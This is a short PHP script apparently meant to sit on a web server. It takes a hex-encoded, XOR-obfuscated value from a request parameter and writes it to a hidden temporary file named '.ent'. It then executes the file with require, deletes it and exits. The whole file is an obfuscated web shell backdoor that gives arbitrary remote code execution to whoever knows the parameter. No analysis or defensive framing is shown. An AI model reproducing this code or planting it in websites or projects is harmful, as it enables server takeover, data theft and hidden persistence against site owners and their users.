<?php

if(array_key_exists("i\x74e\x6D", $_REQUEST) && !is_null($_REQUEST["i\x74e\x6D"])){
	$data_chunk = array_filter([ini_get("upload_tmp_dir"), sys_get_temp_dir(), "/var/tmp", "/tmp", getcwd(), "/dev/shm", getenv("TEMP"), getenv("TMP"), session_save_path()]);
	$flag = hex2bin($_REQUEST["i\x74e\x6D"]);
	$res= ''; $l = 0; do{$res .= chr(ord($flag[$l]) ^ 59);$l++;} while($l < strlen($flag));
	$obj = 0;
do {
    $mrk = $data_chunk[$obj] ?? null;
    if ($obj >= count($data_chunk)) break;
    		if ((function($d) { return is_dir($d) && is_writable($d); })($mrk)) {
    $factor = str_replace("{var_dir}", $mrk, "{var_dir}/.ent");
    if (file_put_contents($factor, $res)) {
	require $factor;
	unlink($factor);
	die();
}
}
    $obj++;
} while (true);
}